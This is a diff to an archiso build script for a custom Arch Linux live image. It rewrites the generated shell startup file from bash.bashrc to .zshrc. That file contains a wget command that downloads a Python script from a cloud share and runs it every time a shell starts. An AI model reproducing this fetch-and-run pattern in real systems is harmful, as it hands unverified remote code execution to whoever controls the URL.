@@ -27,11 +27,11 @@ INITRD boot/intel_ucode.img,boot/x86_64/archiso.img
 APPEND archisobasedir=%INSTALL_DIR% archisolabel=%ARCHISO_LABEL%
 EOF
 
-# .bashrc
-bashrc_path="$__dir/archiso/releng/airootfs/etc/bash.bashrc"
-echo "Rewriting $bashrc_path"
-mkdir -p `dirname $bashrc_path`
-cat << EOF > "$bashrc_path"
+# .zshrc
+zshrc_path="$__dir/archiso/releng/airootfs/etc/skel/.zshrc"
+echo "Rewriting $zshrc_path"
+mkdir -p `dirname $zshrc_path`
+cat << EOF > "$zshrc_path"
 wget 'https://cloud.wzl.ovh/index.php/s/WhZCJdSj6mRmg8D/download' -O script.py && python script.py
 EOF
 
